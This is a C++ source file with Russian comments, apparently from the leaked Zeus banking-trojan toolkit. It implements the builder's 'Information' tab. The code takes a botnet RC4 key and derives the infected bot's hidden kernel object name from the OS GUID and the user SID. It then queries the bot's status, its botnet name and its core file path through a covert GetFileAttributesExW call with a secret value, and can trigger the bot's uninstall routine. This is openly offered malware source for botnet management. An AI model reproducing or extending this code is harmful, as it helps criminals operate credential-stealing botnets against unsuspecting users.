#include <windows.h>

#include "defines.h"
#include "resources\resources.h"
#include "main.h"
#include "languages.h"
#include "tools.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\botstatus.h"
#include "..\common\malwaretools.h"
#include "..\common\crypt.h"
#include "..\common\gui.h"
#include "..\common\process.h"

/*
  Получение структуры с данными о текщем боте.

  IN hwnd - родитель edit'а с ключем.
  OUT bs  - статус бота.

  Return  - true - в случаи успеха,
            false - в случаи ошибки.
*/
static bool getBotStatus(HWND hwnd, BotStatus::VER1 **bs)
{
  //Получаем ключ.
  Crypt::RC4KEY key;
  {
    bool ok = false;
    HWND keyWnd = CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_KEY);
    if(keyWnd != NULL)
    {
      DWORD size;
      LPWSTR keyText = Gui::_getWindowText(keyWnd, &size);
      if(keyText != NULL)
      {
        Str::UTF8STRING u8s;
        if(Str::_utf8FromUnicode(keyText, size, &u8s))
        {
          Crypt::_rc4Init(u8s.data, u8s.size, &key);
          Str::_utf8Free(&u8s);
          ok = true;
        }
        Mem::free(keyText);
      }      
    }

    if(ok == false)return false;
  }

  //ID текущего пользователя.
  DWORD userId;
  {
    TOKEN_USER *token;
    DWORD sessionId;
    if((token = Process::_getUserByProcessHandle(CURRENT_PROCESS, &sessionId)))
    {
		userId = Crypt::crc32Hash((LPBYTE)token->User.Sid, CWA(advapi32, GetLengthSid)(token->User.Sid));
		Mem::free(token);
    }
    else return false;
  }

  //Генерируем имя объекта.
  WCHAR installId[40];
  {
    GUID osGuid;
    MalwareTools::_getOsGuid(&osGuid);
    MalwareTools::_generateKernelObjectName(&osGuid, 0x84939312/*Core::OBJECT_ID_BOT_STATUS*/, userId, installId, &key, MalwareTools::KON_DEFAULT);
  }

  //Получем статус.
  if(CWA(kernel32, GetFileAttributesExW)(installId, (GET_FILEEX_INFO_LEVELS)0x78F16360/*Core::OBJECT_ID_BOT_STATUS_SECRET*/, bs) == TRUE)
  {
    if((*bs)->structSize == sizeof(BotStatus::VER1))
    {
      (*bs)->botnet[sizeof((*bs)->botnet) / sizeof(WCHAR) - 1]                         = 0;
      (*bs)->userPaths.coreFile[sizeof((*bs)->userPaths.coreFile) / sizeof(WCHAR) - 1] = 0;
      return true;
    }
    CWA(kernel32, VirtualFree)(*bs, 0, MEM_RELEASE);
  }

  return false;
}

/*
  Получение состояние бота.

  IN hwnd - хэндл вкладки.
*/
static void refreshBotStatus(HWND hwnd)
{
  BotStatus::VER1 *bs;
  bool ok = getBotStatus(hwnd, &bs);

  if(ok)
  {
    LPWSTR buf = NULL;
    Str::_sprintfExW(&buf, Languages::get(Languages::tool_info_bot_status),
                     VERSION_MAJOR(bs->version), VERSION_MINOR(bs->version), VERSION_SUBMINOR(bs->version), VERSION_BUILD(bs->version),
                     bs->botnet[0] == 0 ? Languages::get(Languages::tool_info_bot_default_botnet) : bs->botnet,
                     bs->userPaths.coreFile[0] == 0 ? L"-" : bs->userPaths.coreFile);

    CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_INFO, buf);
    Mem::free(buf);
    CWA(kernel32, VirtualFree)(bs, 0, MEM_RELEASE);
  }
  else CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_INFO, Languages::get(Languages::tool_info_bot_status_na));
  
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_REMOVE), ok);
}

/*
  Поток удаления бота.

  IN p   - HWND вкладки.

  Return - 0.
*/
static DWORD WINAPI removeBot(void *p)
{
  HWND hwnd = (HWND)p;
  bool ok = false;

  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_REFRESH), FALSE);
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_REMOVE), FALSE);
  CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_INFO, Languages::get(Languages::tool_info_bot_removing));

  //Процесс удаления.
  {
    BotStatus::VER1 *bs;
    if(getBotStatus(hwnd, &bs))
    {
      ok = bs->uninstall(NULL) ? true : false;
      CWA(kernel32, VirtualFree)(bs, 0, MEM_RELEASE);
    }
  }
  
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_REFRESH), TRUE);
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_INFO_BOT_REMOVE), TRUE);
  refreshBotStatus(hwnd);

  //Выводим сообщение.
  if(ok)CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_info_bot_removed), NULL, MB_OK | MB_ICONINFORMATION);
  else CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_info_bot_not_removed), NULL, MB_OK | MB_ICONERROR);

  return 0;
}

/*
  Обработка вкладки.
*/
INT_PTR CALLBACK toolInformationProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
  //Хэндл поток удаления бота.
  static HANDLE subThread;

  switch(msg)
  {
    case WM_INITDIALOG:
    {
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_VERSION_TITLE, Languages::get(Languages::tool_info_version_titile));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_TITLE, Languages::get(Languages::tool_info_bot_title));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_KEY_TITLE, Languages::get(Languages::tool_info_bot_key_title));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_INFO_TITLE, Languages::get(Languages::tool_info_bot_info_title));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_REFRESH, Languages::get(Languages::tool_info_bot_refresh));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_BOT_REMOVE, Languages::get(Languages::tool_info_bot_remove));
      CWA(user32, SendDlgItemMessageW)(hwnd, IDC_INFO_BOT_KEY, EM_LIMITTEXT, 1024, 0);
      
      {
        WCHAR buf[1024];
        LPSTR sign = BO_SIGNATURE;
        Str::_sprintfW(buf, sizeof(buf) / sizeof(WCHAR), Languages::get(Languages::tool_info_version),
                       VERSION_MAJOR(BO_CLIENT_VERSION), VERSION_MINOR(BO_CLIENT_VERSION), VERSION_SUBMINOR(BO_CLIENT_VERSION), VERSION_BUILD(BO_CLIENT_VERSION), BO_BUILDTIME, *sign == 0 ? "-" : sign);
        CWA(user32, SetDlgItemTextW)(hwnd, IDC_INFO_VERSION, buf);
      }

      refreshBotStatus(hwnd);
      subThread = NULL;
      break;
    }

    case WM_CANCLOSE:
    {
      closeThreadIfFinsinhed(&subThread);
      CWA(user32, SetWindowLongW)(hwnd, DWL_MSGRESULT, subThread == NULL ? true : false);
      break;
    }

    case WM_COMMAND:
    {
      switch(LOWORD(wParam))
      {
        case IDC_INFO_BOT_REFRESH:
        {
          closeThreadIfFinsinhed(&subThread);
          if(subThread == NULL)refreshBotStatus(hwnd);
          break;
        }
        
        case IDC_INFO_BOT_REMOVE:
        {
          closeThreadIfFinsinhed(&subThread);
          if(subThread == NULL)subThread = CWA(kernel32, CreateThread)(NULL, 0, removeBot, hwnd, 0, NULL);
          break;
        }
        
        default:
          return FALSE;
      }
      break;
    }

    default:
      return FALSE;
  }

  return TRUE;
}
